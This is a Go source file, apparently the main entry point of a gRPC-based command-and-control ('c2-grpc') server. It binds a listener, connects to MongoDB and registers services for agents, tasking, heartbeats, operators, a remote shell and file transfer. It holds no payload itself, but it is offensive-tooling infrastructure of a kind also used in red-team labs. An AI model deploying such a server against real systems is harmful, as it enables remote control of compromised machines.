package main

import (
	"context"
	"flag"
	"log"
	"net"
	"strconv"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"google.golang.org/grpc"
)

func main() {
	host := flag.String("host", "0.0.0.0", "host interface to bind the gRPC server to")
	port := flag.Int("port", 50051, "TCP port to bind the gRPC server to")
	flag.Parse()

	mongoCtx, cancelMongo := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancelMongo()

	var err error
	mongoClient, historyCollection, agentCollection, err = connectMongo(mongoCtx)
	if err != nil {
		log.Fatalf("mongo connect error: %v", err)
	}
	defer func() {
		disconnectCtx, cancelDisconnect := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancelDisconnect()
		_ = mongoClient.Disconnect(disconnectCtx)
	}()

	listenAddr := net.JoinHostPort(*host, strconv.Itoa(*port))
	lis, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("listen error: %v", err)
	}

	log.Printf("[server] c2-grpc server running on %s", lis.Addr().String())
	log.Printf("[server] mongodb connected on localhost:27017")

	s := grpc.NewServer()
	pb.RegisterAgentServiceServer(s, &agentServer{})
	pb.RegisterHeartbeatServiceServer(s, &heartbeatServer{})
	pb.RegisterTaskServiceServer(s, &taskServer{})
	pb.RegisterOutputServiceServer(s, &outputServer{})
	pb.RegisterOperatorServiceServer(s, &operatorServer{})
	pb.RegisterHistoryServiceServer(s, &historyServer{})
	pb.RegisterShellServiceServer(s, &shellServer{})
	pb.RegisterFileServiceServer(s, &fileServer{})

	go startWatchdog()

	if err := s.Serve(lis); err != nil {
		log.Fatalf("serve error: %v", err)
	}
}
